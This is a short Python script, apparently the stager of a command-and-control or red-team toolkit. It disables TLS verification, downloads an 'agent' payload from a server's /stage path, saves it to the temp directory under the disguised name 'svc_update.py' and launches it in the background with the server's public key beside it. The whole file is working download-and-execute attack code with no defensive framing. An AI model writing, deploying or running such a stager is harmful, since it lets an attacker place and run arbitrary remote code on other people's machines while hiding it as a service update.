#!/usr/bin/env python3
"""Minimal stager - downloads full agent from server /stage and executes it."""
import sys, urllib.request, ssl, tempfile, subprocess, os

SERVER = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
AGENT_ARGS = sys.argv[2:]  # e.g. --transport http --url http://127.0.0.1:8080

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

url = SERVER.rstrip("/") + "/stage"
try:
    with urllib.request.urlopen(url, context=ctx, timeout=30) as r:
        code = r.read()
except Exception as e:
    print(f"[!] stage download failed: {e}")
    sys.exit(1)

path = os.path.join(tempfile.gettempdir(), "svc_update.py")
with open(path, "wb") as f:
    f.write(code)

# ensure agent has access to server public key (copy if adjacent file exists)
for name in ("server_public.pem",):
    local = os.path.join(os.path.dirname(path), name)
    if not os.path.exists(local) and os.path.exists(name):
        with open(name, "rb") as s, open(local, "wb") as d:
            d.write(s.read())

print(f"[*] Staged to {path}, launching...")
subprocess.Popen([sys.executable, path] + AGENT_ARGS)
